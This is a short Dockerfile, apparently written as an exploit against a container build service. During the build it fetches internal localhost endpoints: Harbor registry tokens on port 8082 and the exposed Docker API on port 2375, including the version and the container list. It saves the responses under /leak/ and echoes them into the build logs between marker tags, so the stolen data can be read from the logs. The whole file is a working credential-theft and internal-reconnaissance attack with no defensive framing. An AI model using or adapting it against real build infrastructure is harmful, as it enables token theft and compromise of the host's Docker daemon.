FROM scratch
ADD rootfs.tar /
ADD http://127.0.0.1:8082/api/v1/token/harbor /leak/harbor.json
ADD http://127.0.0.1:8082/api/v1/token/version /leak/version.json
RUN /bin/sh -c 'N=TOK4_0926_0050; echo "[MARK] $N"; echo "[HARBOR-TOKEN]"; cat /leak/harbor.json; echo; echo "[VERSION-TOKEN]"; cat /leak/version.json; echo; echo "[END-TOKENS]"'
ADD http://127.0.0.1:2375/version /leak/dockerapi-version.json
RUN /bin/sh -c 'echo "[DOCKERAPI-2375-VERSION]"; cat /leak/dockerapi-version.json; echo; echo "[END-DAPI]"'
ADD http://127.0.0.1:2375/containers/json /leak/dockerapi-containers.json
RUN /bin/sh -c 'echo "[DOCKERAPI-2375-CONTAINERS]"; head -c 4000 /leak/dockerapi-containers.json; echo; echo "[END] TOK4_0926_0050"'
ENTRYPOINT ["/bin/sh","-c"]
